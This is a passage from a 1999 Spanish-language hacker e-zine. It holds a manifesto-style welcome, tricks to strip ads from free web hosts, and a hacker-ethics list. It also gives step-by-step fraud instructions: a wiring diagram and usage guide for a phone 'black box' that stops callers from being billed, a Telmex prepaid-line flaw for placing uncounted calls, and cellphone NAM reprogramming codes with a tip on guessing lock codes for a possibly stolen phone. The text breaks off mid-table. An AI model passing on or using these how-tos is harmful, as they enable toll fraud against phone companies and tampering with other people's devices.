  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

            [ Raza Mexicana E-Zine VIII ฤอออฤ  Octubre de 1999 ]


           yyysvssyyy    yyyyssssyyyv  yyyyssssyyyv  yyyyssssyyyv
           |lS$A  |lS$$  """     lS$A  """     lS$A  """     lS$A
           :|lSR  :|lS$  yyyyssss|lSR          |lSR  yyyyssss|lSR
           :||lF$$$Sl||  :|lS    :|lF  ::|lS$$$Sl|F  :|lS    :|lF
           :::|l  :::|l  ::|l    ::|l  ::|l          ::|l    ::|l      
           ::::|  ::::|  :::|    :::|  :::|     ...  :::|    :::|      
           .::::  .::::  .:::....::::  .:::::::::::  .:::....::::
                   w w w . r a z a - m e x i c a n a . o r g 
                        
              El destruir al indigena es destruir al hombre mismo.

  Mexico $50.00 M.N.
  บณณณณบณณณณณณบ   
  บณณณณบณณณณณณบ  ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
 0บRaZa บMeXiCaNa บ1  AcidGum altekx_h3z DaCure DeadSectr dr_fdisk^ Megaflop 
                      Nahual Nauj pablojuan Kukulkan SufferBoy- xDAWN Yo_Soy
 ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
   C O N T E N I D O  ]ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ[ A u t o r ]ฤฤฤ

   01   Bienvenida ..................................... Editor
   02   Fuckind ADS .................................... Rad-Etnic
   03   Etica Hacker ................................... 12r Overdrive
   04   Black Box ...................................... SufferBoy-
   05   Sistema Precisa - Telmex ....................... IGNiTiON TeAM
   06   Programacion de Celulares ...................... SatMex
   07   Dinero tirado a la basura ...................... Vlad
   08   Criptografia Moderna ........................... alt3kx_H3z
   09   Consiguiendo Info de usuarios SkyCard .......... Vlad
   10   Brincar Banners ................................ SatMex
   11   Tips de seguridad en Linux ..................... PabloJuan
   12   Version 2.8 / Hybrid-6b96 Vulnerable ........... dr_fdisk^
   13   DNS explotable en informacion falseada ......... alt3kx_H3z
   14   Unix Shell Scripting ........................... Yo_Soy
   15   ISP Internet Accounts .......................... Vlad / Yo_Soy
   16   Incidencias en Latinoamerica ................... alt3kx_H3z
   17   Raza 18 - Noticias ............................. ToPo
   18   Bugs y Exploits ................................ Yo_Soy
   19   Llaves PGP ..................................... RMHT
   20   Despedida ...................................... RMHT
 อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  อออ[ RAZA MEXICANA TEAM

  Acidgum (securemex@bigfoot.com)        alt3kx_H3z (alt3kx_h3z@hotmail.com)
  Dacure (DaCure_rulz@hotmail.com)       DeadSectr (deadsectr@mixmail.com)
  dr_fdisk^ (dr_fdisk@hotmail.com)       Kukulkan (KuKulKan_@hotmail.com)
  Megaflop (sniffer@usa.net)             Nahual (nahual@sdf.lonestar.org)
  nauj (nauj@nauj.net)                   pablojuan (pablo_juan@yahoo.com)       
  SufferBoy-(sufferboy-@surferdude.com)  ToPo (topo_mayor@hotmail.com)
  xDAWN (xdawn@bigfoot.com)              Yo_Soy (varf@bigfoot.com)
  Vlad (v14d@usa.net)     

  อออ[ DISPONIBLE EN

   http://www.raza-mexicana.org                    Raza Mexicana Team
   http://raregazz.acapulco.uagro.mx               RareGaZz Team
   http://www.vanhackez.com                        Taberna de VanHackez
   http://www.bigfoot.com/~darkangelweb            Pagina de Darkangel
   http://members.xoom.com/zine_store              Pagina de Mau
   http://alpedos-team.org                         Alpedos Team

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ< 

  _______________________/\[  B I E N V E N I D A  ]\______________________

  Credencial para votar con fotografia......pentium 3....."Bugs" de
  microsux ..cada dia son mas los medios de control e  identificacion
  del  gobierno, pero aqui estamos, para defender el anonimato de las
  personas, colaborando entre nosotros, ayudandonos, compartiendo,
  conviviendo,  diviretiendonos......utilizando lo que otros desperdician,
  envidiados por nuestros conocimientos, perseguidos por nuestros ideales,
  pero.......al fin....libres. Asi somos nosotros....diferentes..."raros"
  ..entrelazados por una  hermandad...haciendo cosas por los demas sin
  esperar recibir algo a cambio, regalando nuestro trabajo por ayudar a
  otro...a otro como nosotros..........soportando este mundo regido por
  el capitalismo.....   pero viviendo en un mundo cybernetico....un mundo
  ut๓pico, imposible de imaginar por una persona envevida por el dinero,
  envidia, odio, corrupcion.........un......... paraiso cybernetico.......
  un mundo creado por nosotros mismos.....pero.... ya corrompido por los
  gobiernos...esto es lo que defendemos...y nos llaman criminales...
  "cybercriminales"....asi nos encasillan....y eso....que ellos son los
  invasores......invasores que no pueden concebir  la  existencia de un
  mundo asi...que...simplemente al no comprenderlo....lo destruyen.......
  pero siempre existiremos, jamas desistiremos............................

  Ya esta cerca el final de este milenio, y no podia faltar  raza-mexicana,
  Aqui esta el ultimo RaZa-zine del milenio, del siglo XX, un siglo que
  sera recordado para siempre, guerras mundiales, inventos sorprendentes,
  adelantos sorprendentes en todos los ambitos, el hombre en la luna,
  bomba nuclear, computadoras, internet. Revoluciones, opresiones, no podia
  faltar la mencion del 2 de octubre en mexico, dia en que el gobierno
  mato a jovenes, jovenes revolucionarios que querian un mexico nuevo,
  un mexico libre..... un mexico lider. Ahora la revolucion la hacemos
  nosotros, no con armas, ni manifestaciones, sino con nuestros actos,
  nuestros conocimientos, nuestras creencias, sin violencia, a pesar de
  las barreras que nos pongan, siempre pasaremos por sobre de ellas,
  porque somos mexicanos, los nuevos mexicanos del siglo XXI, somos latinos,
  latinoamerica esta saliendo a flote, el impero gringo decae...es tiempo
  de que latinoamerica surga como nueva potencia mundial, y nos toca a
  todos los jovenes  hacer ese cambio, con ayuda mutua, ya no cabe el
  odio, ni el racismo, es tiempo de ayudarnos..........

  Con estas palabras iniciamos el RaZa-EzInE-8

                                 >>KuKulKan<<
                             www.raza-mexicana.org      
                           raza-mexicana@bigfoot.com

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฑฑฑฒฒฒฐฐฐฐ   Raza Mexicana Presente .... ahora y siempre !  ฐฐฐฐฒฒฒฑฑฑฐฐ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ< 

                          [-----Fucking ADS------]
                               
  ..por [Rad-Etnic]                                  (c) 1999 Rad-Etnic [ฎ]


 ATENCION...el texto te va a decir como mierda sacar esas putas propagandas
 que ponen los servicios gratuitos de hosting lo cual termina siendo muy
 molesto.


 Temas..

 1.Que vamos a sacar?.
 2.Cuales servidores son los que podemos truquear?.
 3.Geocities (11 MEGABYTES GRATUITOS).
 4.Xoom (ESPACIO ILIMITADO).
 5.Webjump (25 MEGABYTES GRATUITOS). 
 6.Virtualave (20 MEGABYTES GRATUITOS).
 7.Nota Final.

-----------------------------------------------------------------------

 1.Que vamos a sacar?.

 Si no sabes que vamos a sacar, no hay problema te explico. Estan los 
 servicios de hosting gratuitos , por ejemplo "XOOM.COM", o "WEBJUMP.COM"
 entonces decir , cool espacio gratis, xoom ahora creo que da "ILIMITADO";
 y te re copas en el tema....pero llega el momento en que pones la url de
 tu pagina y ves una tremenda asquerosa barra de propagandas arriba de lo
 que contiene cada pagina tuya....uhhh dios.... Sino, Geocities te abre una 
 pop-up de mierda tambien , las pop-ups son las ventanitas esas que te abre
 cuando entras a la pagina. Hay bastantes cosas que te agregan, como la
 propaganda esa que te sigue el scrolling de la page....agh, mierda bueh.

 Pero no te preocupes, siempre hay una solucion para todo y esta vez no es
 agarrar la Magnun calibre 48 y cagarte a balasos. No! carajo! esta vez
 tenemos unasolucion que no te va a sacar la vida. Hay una forma de
 insertar unos java scripts en el html de tu pagina (el HTML es el codigo
 con el cual se hace una pagina web, pero si usas solo programas como el
 COOL PAGE, frontpage, etc... seguro que no lo conoces.) y de esa forma
 evitar que aparezcan los molestos ads (avisos) de estos servidores
 "GRATUITOS".


 2.Cuales servidores son los que podemos truquear?.

 Vamos a ver....hmmmm los servidores que se pueden truquear son todos
 aquellos que te pongas avisos en pop-ups,scrollers,etc... pero el problema
 es que no siempre el scripts es el mismo =(. De los servidores que yo les
 voy a mostrar, van a ser :

 http://www.webjump.com    (25MB DE HOSTING GRATUITOS)
 http://www.geocities.com  (11MB DE HOSTING GRATUITOS)
 http://www.xoom.com       (ILIMITADOS MB DE HOSTING GRATUITOS)
 http://www.virtualave.com (20 MB DE HOSTING GRATUITOS)

 Ahora en las siguientes secciones voy a explicar detalladamente como
 usar los scripts en cada uno de los servers.


 3.Geocities (11 MEGABYTES GRATUITOS)

 Ok, empezemos por el mas facil de todos. Este truquillo no es nada nuevo
 al menos para mi, pero lo posteo porque supongo que hay un tocaso de uds.
 que no lo saben.
 Se hace de la siguiente manera:
 Editamos nuestra pagina web, pero con un editor de HTML o simplemente
 usando el querido NOTEPAD, recomenando. Ahora nos fijamos al final
 donde esta el tag o linea </html>. Lo que vamos a hacer es esto, agregamos
 2 lineas arriba de </html> que digan <noscript>. Esto quedaria asi:

 ...
 <noscript>
 <noscript>
 </html>

 Ok, ahora , debajo del tag </html> vamos a agregar 2 lineas mas, que digan 
 tambien <noscript>. Entonces esto terminaria quedando asi :

 ...
 <noscript>
 <noscript>
 </html>
 <noscript>
 <noscript>

 Ok, ahora salvamos y subimos la page a geocities, y WOALA ! WORKS !, no
 tenemos un puto aviso de esos no more.


 4.Xoom (ESPACIO ILIMITADO).

 Oka, el servidor este, se hizo bastante famoso con sus croe que 5mb,
 despues paso a 11 y ahora da ilimitado. Pero el forro de mierda nos puso
 una barra de propaganda arriba de aca una de nuestras paginas.

 Para sacarlo, tenemos el siguiento truquillo :

 Xoom, nos dice que nuestra direccion es members.xoom.com/user
 pero en realidad nos dice eso, porque esa direccion nos direcciona al 
 script de los avisos, pero lo que casi nadie sabe es que la direccion real
 es http://members.xoom.com/_XOOM/user/index.html <--- esta es la verdadera.
 Esta direccion no tiene nada de scripts de avisos, nada nada.

 IMPORTANTE = No hay que olvidarse que despues de poner /_XOOM/user/ hay
 que poner si o si el nombre de la pagina htm o html,
 tipo /_XOOM/user/index.html o /_XOOM/user/main.htm como sea.

 Bue' aca termina otro de los truquillos, ahora veremos otros.


 5.Webjump (25 MEGABYTES GRATUITOS).

 Otro de los tantos servers que nos da espacio bastante y suficiente,
 pero nos pone los reputos ads, bueh, en este es un poco mas complicado
 que en los anteriores pero saldremos a flote como siempre, porque para
 eso 'tamos.

 Edita la pagina, con un editor HTML. Busca la linea </head> y pone el
 script que te voy a dar ahora justo despues de </head> :

 <script LANGUAGE="JavaScript">
 <!--
 if (top != self)
 top.location.href="index.html"
 //-->
 </script>

 ahora, si tu pagina que editas no se llama index.html, cambia de
 "top.location.href="index.html" <--- que suponete que estas editando
 games.htm, entonces en total tendria que quedar : 

 <html>
 <head>
 <title>MI PAGINA DE JUEGOS</title>
 </head>
 <script LANGUAGE="JavaScript">
 <!--
 if (top != self)
 top.location.href="games.htm"
 //-->
 </script>
 <body>

 Y listo, otra vez mas, ganamos nosotros los usuarios.

 6.Virtualave (20 MEGABYTES GRATUITOS).

 Bueh..el ultimo para truquear por ahora..pronto voy a tener mas, no se
 preocupen..      ...pronto ;-p.

 Aca, editamos para ver el HTML de nuestra pagina, y buscamos el tag o
 linea </html> , tiene que ser la ultima linea de todas y no tiene que
 haber nada despues de esta. Ok , ahora vamos a agregar el siguiente
 script despues de </html> :

 <script>
 <!-- The Original Treematode -->
 <!-- Copyright 1998-99 javajunkie / molcha@bonbon.net -->
 var joe2Var = "cri"; 
 document.write("<nos"+joe2Var+"pt>") 
 </script>

 entonces quedaria :

 </html>
 <script>
 <!-- The Original Treematode -->
 <!-- Copyright 1998-99 javajunkie / molcha@bonbon.net -->
 var joe2Var = "cri"; 
 document.write("<nos"+joe2Var+"pt>") 
 </script>

 Y listo....nuevamente...we win they l00se.

 7.Nota Final.

 Otra vez, espero hayamos llegado a lo que esperabamos, que tu pagina
 este libre de toda esta basura de ADS.

 Gracias a :

 Pescad0r & Payton porque vamos a ser da best business ever.
 Tambien, Payton por meterme en el tema de Quake2, que una vez que lo
 agarre, no lo pude soltar. QUAKE2 RULEZ.
 A mis compa~eros de laburo,
 y a todas esas personas que me dieron una mano cuando le necesite.

 Peace Bro

 Cya n3x7 3d1710n
 n1c3 37n1c cl34n1n6
 (c) 1999 Rad-Etnic [ฎ]

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

                  ------------ETICA HACKER-------------
                  --------------Por 12r----------------
                  --------12r@antisocial.com-----------
                  -------------------------------------



 De unos aคos para aca, hemos visto el boom del hacking, tanto en revistas,
 periodicos, television, radio y por supuesto Internet se habla sobre
 hackers los cuales por lo regular siempre son los "malos de la pelicula".

 Gracias a la desinformacion de estos medios se ha generado una mala fama
 para los hackers he incluso en algunos paises se han desatado caserias
 de brujas contra cualquier persona que sea sospechosa de serlo. 

 Estos son a mi criterio 10 puntos de lo que un verdadero hacker debe de
 tomar en cuenta para poder llevar la frente en alto de portar el
 apelativo de "HACKER".


 01.- El espiritu del hack es aprender sobre un sistema no daคarlo.

 02.- No seas egoista, comparte la informacion para asi expandir el
      conocimiento.

 03.- Usa la tecnologia para un fin benefico,  ocupa tus habilidades
      y conocimientos para ayudar a los demas.

 04.- Rebelate contra la represion de cualquier tipo y lucha por el
      derecho de libertad.

 05.- Cuando tengas el control de algun sistema no borres, muevas,
      alteres o daคes archivos dejalos como estan. (exceptuando los
      archivos que puedan delatar tu prescencia). Informa a los
      administradores de dicho sistema sobre sus fallas.

 06.- Se inteligente y conoce tus limitaciones, nunca hagas nada que
      te pueda causar problemas.

 07.- No caigas en los mismos pasos que el gobierno tratando de meterse
      con nuestras vidas, en pocas palabras: No invadas la privacidad
      de los demas!.

 08.- Piensa por ti mismo, no des nada por hecho, cuestiona todo.
      Se inteligente y mantente intelgente.

 09.- La vanidad y la avaricia son dos pecados capitales, por lo que
      un verdadero hacker no hackea por ganar dinero o fama.

 10.- Nunca alardees de tus conociminetos se lo mas humilde que puedas.


						12r 0verx.

       ____         __          __   _              
      / __ \ ___   / /_  ___   / /  (_) ____   ____
     / /_/ // _ \ / __ \/ _ \ / /  / / / __ \ / __ \
    / _, _//  __// /_/ /  __// /  / / / /_/ // / / /_
   /_/ |_| \___//_.___/\___//_/  /_/  \____//_/ /_/(_)
   1999 

  AVISO:Literary Freeware by 12r Overdrive.
  Este articulo fue ralizado sin ningun fin de lucro por 12r Overdrive y
  puede ser copiado y distribuido por cualquier medio siempre y cuando
  aparesca esta leyenda en todas y cada una de las copias hechas del mismo.
  Homepage: http://rebelion.cjb.net
  e-mail: rebeli0n@antisocial.com

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<


                           B L A C K   B O X E S
                              The Fallen Angel


  ===[ Que diablos es una Black Box ?


  Esta cosa es un pequeคo dispositivo que se conecta al telefono, de tal
 manera que cuando recibes una llamada, la persona que llama no paga la
 llamada.    Mmmmm, algo es algo no ?, bueno, esto esta bien cuando haces
 llamadas de menos de media hora, despues de ese tiempo TelMex podria
 sospechar.


 ===[ Por que sospecharia TelMex ?


  Lo que hace este peque๑o animalito es que cuando uno ya esta hablando
 con el zonzo del otro lado, wwwooww simula para TelMex que el maldito
 telefono esta sonando ( ring, ring, ring, ring ... ). Por eso mismo, la
 compaคia dira "Haaa, que madres pasa, el telefono lleva sonando mas de
 media hora, hay que investigar" y entonces, Uppps Pinche ensartada que te
 acomodan, y estaras a la sobra un buen rato, ya que esto segun ellos es
 "Delito Federal" aunque considero que es mas delito la pinche tarifa que
 cobra TelMex, pero en fin.


 ===[ Y como diablos la construyo ?


  A continuacion esta la lista de los materiales, los puedes comprar en la
  tiendita de la esquina ;-)


  1 resistencia de 1800 k ohms de 1/2 de watts
  1 led de cualquier color de 1.5 volt
  1 interruptor


        LINEA  >--------------------------Verde--->Al
   TELEFONICA  >---|  1.8K    LED  |------Rojo---->Telefono
                   |-/\/\/\---|>>--|
                   |               |
                   |----*/ *-------|
                     interruptor


 Por si hay algun pendejin : El Verde y Rojo son los colores de los cables.


  Descripcion:


	   /\/\/\   resistencia
           |>>      LED, en el sentido que indica (este solo deja pasar
                    la corriente en el sentido que se ha puesto, segun
                    como lo conectes lo hara o no)
	   */ *     interruptor


 ===[ Bueno, ahora como se si funciona ?


  Una ves que ya la conectaste, para sabes si funciona, descuelga la bocina
  entonces se devera encender el Led, si no enciende cambia los cables, puede
  que los hallas intercambiado ;-)


 ===[ Como Uso esta Cosa ?


  Bueno, cuando el interruptor esta en ON (Encendido), solo puedes recibir
 llamadas. To fono sonara como de costumbre y el LED parpadeara unas veces.
 Si descuelgas en ese momento ... explotara el telefono del otro lado ;-)
 jejeje, no es cierto, el otro individuo NO PAGARA la llamada y ... despues
 de bla bla bla bla bla bla y sepa que mas .. solo cuelgas como una llamada
 comun y corriente. OOHHhhh eso si, cuando intentes llamar, tendras que poner
 el interuptor a OFF (Apagado), ya que si no no podras tener tono de marcado,
 al apagarla ya puedes hacer la llamada como si nada.


                                              Editado por: The Fallen Angel


 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

                 oO0 NOTIFICACION DE VULNERABILIDAD 0Oo
                     -=+ SISTEMA PR3C1S4 T3LM3X +=-
                             [IGNiTiON TeAM]


 La informacion contenida en esta notificacion es exclusivamente con
 fines informativos, cualquier uso indebido de la informacion presentada
 es responsabilidad de quien haga uso de ella. IGNiTiON ni sus miembros
 se hacen responsables de dicho uso.


 -= 18-AGOSTO-1999 =-


 ESCENARIO:
 La empresa nacional de telefonia local en Mexico (T3LM3X) cuenta con
 un servicio de llamadas limitadas mensualmente, conocido como sistema
 PR3C1S4. Este sistema permite realizar 100 llamadas mensuales locales,
 de larga distancia, a celular, etc. Al agotar el numero de llamadas es
 necesario activar una ficha de prepago que abona mas llamadas a la
 linea del usuario.



 VULNERABILIDAD:
 El limite de llamadas del sistema PR3C1S4 puede ser sobrepasado aun
 cuando dichas llamadas hayan sido agotadas, y tambien es posible
 realizarlas sin que estas sean descontadas de las llamadas disponibles.
 Esta puerta trasera o falla en el sistema permite solo la realizacion
 de llamadas locales.



 EXPLOIT:
 Al marcar cualquier numero local reemplazar el NPA de la cd. (5 en el
 caso de la cd. de Mexico) por un "0".


 Ejemplo:

         (5)666-6666
   ----> (0)666-6666    ----> La llamada no es descontada
	


 STATUS: Activo parcialmente. Se desconoce si T3LM3X esta al tanto de
 la falla, sin embargo en la cd. de Mexico en algunas areas ya no es
 posible a partir del dia 18 de Agosto de 1999 realizar dichas llamadas.
 Se tiene conocimiento de esta falla en otras ciudades como Guadalajara
 y Queretaro.

 
 [IGNiTiON TeAM]
 MEXICO - 1999
 E-mail: imagazine@usa.net


 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฑฑฑฒฒฒฐฐฐฐ   Raza Mexicana Team - Matando tus neuronas...   ฐฐฐฐฒฒฒฑฑฑฐฐ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ< 


              P R O G R A M A C I O N   D E   C E L U L A R E S
                           p o r    S a t M e x 


 **************************************
 * MODELO NOKIA/MOBIRA P4000 & PT612  *
 **************************************

 NOTA:   Estas son unidades NAM duales
         El prefijo ESN es 165 en decimal y A5 hex.
         Nokia: 813-536-5553

 PROGRAMACION DE LA NAM:

 1.  Enciendelo.

 2.  Entra * 3 0 0 1 # S S S S S SEL 9 END donde SSSSS es codigo de 
     seguridad   1 2 3 4 5 es el defecto de fabrica.

 3.  Si la entrada fue corecta pondra "IdEnt IF InFO Pri"

 Saltate al paso 7 para programarla NAM 1, o completa de 4 - 6 para 
 encender la NAM 2.

 4.  Presiona SND para poner "IdEntif InFO OPT"
 
 5.  Pulsa END y pondra "OPt InFO diSAbLEd"
 
 6.  Pulsa SND y pondra "OPt InFO EnAbLEd"

 7.  Pulsa END, la primera entrada de datos aparecera.

 8.  SND se usa para cambiar parametros digitales solo.

 9.  Pulsa END para almacenar e incrementar cada paso.

 10. En cualquier momento pulsa SEL CLR para salir del programa.


 DATOS DE PROGRAMACION

 PASO#    #DE DIGITOS/RANGO   EN PANTALLA    DESCRIPCION


 01       00000 - 32767     HO-Id          ID SYSTEM
 02       0 OR 1            ACCESS         MARCA MIN 
 03       0 OR 1            LOCL OPt       LOCAL USE MARK
 04       10 DIGITS         Phonxx         MIN (AREA CODE & TEL#)
 05       08 ONLY           St CLASS       STATION CLASS MARK
 06       333 OR 334        PAging Ch      INITIAL PAGING CHANNEL
 07       2 DIGITS          O-LOAd CLASS   ACCESS OVERLOAD CLASS
 08       A OR B            PrEF SyS       PREFERRED SYSTEM (SND TOGGLES)
 09       2 DIGITS          grOUP Id       GRUPO ID (10 EN USA)
 10       5 DIGITS          SECUrity       CODIGO SEGURIDAD (DEJAR EN 12345)
 11       8 DIGITS          SERIAL NUMBER  NO CAMBIAR
 12       MM/DD/YY          1 dAtE         NO CAMBIAR
 13       MM/DD/YY          2 dAtE         FECHA DE INSTALACION


    *****************************
    *  MODELO NOKIA LX11 & M11  *
    *****************************


 NOTA:   Estas son unidades NAM duales
         El prefijo ESN es 165 en decimal y A5 hex.
         Nokia: 813-536-5553

 PROGRAMACION DE LA NAM:

 1.  Enciendelo.

 2.  Pulsa * 3 0 0 1 # S S S S S SEL 9 END donde SSSSS es el codigo de
     seguridad  1 2 3 4 5 es por defecto de fabrica.

 3.  Si lo de arriba es correcto pondra "IdEnt IF InFO Pri"

 Pasa al paso 6 para programar la NAM 1, o sigue 4 & 5 para cambiar a NAM 2.

 4.  Pulsa SND y pondra "OPt InFO diSAbLEd"

 5.  Pulsa SND y pondra "OPt InFO EnAbLEd"

 6.  Pulsa END, y saldra la primera entrada de datos.

 7.  Pulsa END para almacenar e incrementar cada paso.
 
 8.  La tecla SND cambia la opcion digital simple.

 9.  Pulsa SEL CLR para salir del programa habiendo seguido todos los pasos.


 DATOS DE PROGRAMACION

 PASO#    #DE DIGITOS/RANGO   EN PANTALLA    DESCRIPCION

 01       00000 - 32767       HO-Id          ID SYSTEM 
 02       0 OR 1              MIN Mark       MARCA MIN 
 03       0 OR 1              LOCL OPt       MARCA DE USO LOCAL 
 04       10 DIGITS           Phonxx         MIN (AREA CODE & TEL#)
 05       08 ONLY             St CLASS       MARCA DE CLASE DE ESTACION
 06       333 OR 334          PAging Ch      INITIAL PAGING CHANNEL
 07       2 DIGITS            O-LOAd CLASS   ACCESS OVERLOAD CLASS
 08       A OR B              PrEF SyS       PREFERRED SYSTEM (SND TOGGLES)
 09       2 DIGITS            grOUP Id       GRUPO ID (10 EN USA)
 10       5 DIGITS            SECUrity       CODIGO SEGURIDAD
 11       MM/DD/YY            1 dAtE         NO TOCAR
 12       MM/DD/YY            2 dAtE         DATO DE INSTALACION
 13                           Prog done      PULSA SEL CLR PARA SALIR

 BLOQUEO: SEL LCK.  DESBLOQUEO: Entra el codigo de 4 digitos.
 
 SELECTOR DEL SISTEMA: SEL 1 luego 1 para scroll: A = A solo, b = B solo,
 S = Pref/no pref, H = Regreso solo.

 ****************************
 * MODELO NOKIA M10, TC2000 *
 ****************************

 NOTA:   Estas son unidades NAM duales
         El prefijo ESN es 165 en decimal y A5 hex.
         Nokia: 813-536-5553

 PROGRAMACION DE LA NAM:

 1.  Enciendelo.

 2.  Pulsa * 1 7 * 3 0 0 1 * L L L L *, donde LLLL es el codigo de bloqueo
     por defecto de fabrica es 1234. Si no se sabe el codigo (robado?) 
     prueba a poner numeros de 4 cifras, haber si aciertas, pues tienes la
     ventaja de que a la tercera oportunidad no te bloquea el movil....

 3.  Pulsa SEL para almacenar los datos y para moverte entre los nombres 
     de parametros y las entradas.

 4.  Pulsa CLR para corregir la entrada.

 5.  Pulsa END para abortar la programacion.

 6.  En cualquier momento pulsa SEL END para salir y completar la
     programacion el telefono saldra solo si tocas con el puntero todos
     los parametros.


 PROGRAMACION DE DATOS

 PASO#    #DE DIGITOS/RANGO   EN PANTALLA    DESCRIPCION

 01       00000 - 32767       HO-Id          SYSTEM ID
 02       0 OR 1              ACCESS         METODO DE ACCESO (MIN MARK)
 03       0 OR 1              LOCAL          LOCAL USE MARK
 04       10 DIGITS           Phone N        MIN (AREA CODE & TEL#)
 05       08 ONLY             CLASS          STATION CLASS MARK
 06       333 OR 334          PAGE ch        INITIAL PAGING CHANNEL
 07       2 DIGITS            O-LOAd         ACCESS OVERLOAD CLASS
 08       2 DIGITS            GrouP          GROUP ID (10 IN USA)
 09       4 DIGITS            Loc CodE       CODIGO DE BLQUEO

 NOTE: Se sugiere que el codigo de bloqueo sea dejado 1234, o
       los cuatro ultimas cifras del numero de telefono.


 BLOQUEO: SEL LCK.  DESBLOQUEO: Entra codigo de 4 cifras.

 SELECTOR DEL SISTEMA: SEL 1 cuando 1 para moverte: A = A solo, b = B 
 solo, S = Pref/no pref, H = Regreso solo.



       *********************
       * MODELO NOKIA 121  *
       *********************

 Para entrar en el sistema de datos pulsa *60312#12345, y luego la tecla
 M seguida de la localizacion de memoria 00 (cero, cero)

 Ahora veras "Store Not Done" en la pantalla. Usa la tecla de (R)ellamada
 seguida de las localizaciones 1, 2, 4 y 5...

 El NOKIA 121 es similar a la serie 101/201 (es el mismo telefono
 excepto el teclado y el software...Technophone tambien tiene un modelo
 que es identico (osea que es mas baratillo el de esta marca...)
 Las localizaciones 1 & 2 contienen la informacion para la NAM 1 mientras
 que la 4 & 5 contienen la NAM 2. No estoy seguro en el NOKIA 121
 pero para el 101/201 aqui esta la secuencia de programcion...
 
 *3001#12345 <STO> 00  (Pone en pantalla "store not done")
 RCL 01 te da el codigo del pais, llamada de emergencia y codigo de 
 bloqueo RCL 02 te da el numero de telefono de 10 digitos
 RCL 03 te da el SYS ID (5 digitos, 3 de ellos no se ven hasta que no
 bajes hacia abajo cuando programes el telefono , el bit de acceso
 local, la marca MIN, el canal de control inicial, la clase de
 sobrecarga de acceso y el grupo ID.

 Estas 3 localizaciones de memoria son para la NAM 1, y 4&5 lo son para
 la NAM 2 (la localizacion de memoria  01 es comun para ambas NAMS)

 ***************************
 * Programacion Nokia 918  *
 ***************************

 Encender equipo
 *,#,639,#
 Aparece:Numero de celular
 poner 5263 XXX XXX Snd
 Code? 24619 0000 #2 # XXXX Snd
 Aceptado

 Ajustar Banda
 Menu 5 ><Ok


 **************************
 * Programacion Nokia 252 *
 **************************

 *#639#
 (coDigo de el pais ,lada)52-63X XXX XXX
 24619 snd
 Banda
 Menu 5

 **************************
 * Programacion Eriscsson *
 **************************

 encender equipo
 precionar FCN sostenido y 923885
 avanzar con RCL,Sto(en pantallaaparecen las opciones)
 sales con end
 Ajustar Banda Fcn 5

 ************************************************
 * Telefonos Audiovox 750 ,Prestige, Pr 130,150 *
 ************************************************

 Prender Equipo
 -XXX FNC,#1
 -01 52 63 XX XX XX STO(lada,pais,numero de celular)
 -02 XXX(ULTIMOS 3 NUMEROS DE EL CELULAR)
 -03 24619(SIDH)
 -04 05 STO
 -05 10 STO
 -06 1 STO
 -07 1 STO
 -08 333 STO
 -09  STO
 -10  STO 
 -11  STO
 -12  STO
 -13  STO
 -14  STO
 -15  STO
 -16  STO
 -FNC SND
 -FNC CLR
 AJUSTAR BANDA
 FCN 01,CLR O SND



 ***************************************************
 * PROGRAMACION PARA CUALQUIER CELULAR MOTOROLA    *
 ***************************************************

 PRECIONAR FNC 13 VECES EL 0 Y RCL

 APARECE                           PRECIONAR                         PONER                                                            PRECIONAR
     01                                            *                                           24619                                                                   *
     02                                            *                                           526				                *
     03                                            *                                           317 XXXX				*
     04                                            *                                           14					*
     05                                            *                                           0 X --> ULTIMO DIGITO DE TEL		*
     06                                            *                                           10					*
     07                                            *                                           000000					*
     08                                            *                                           XXX (ULTIMOS 3 DIGITOS DE TEL.	*
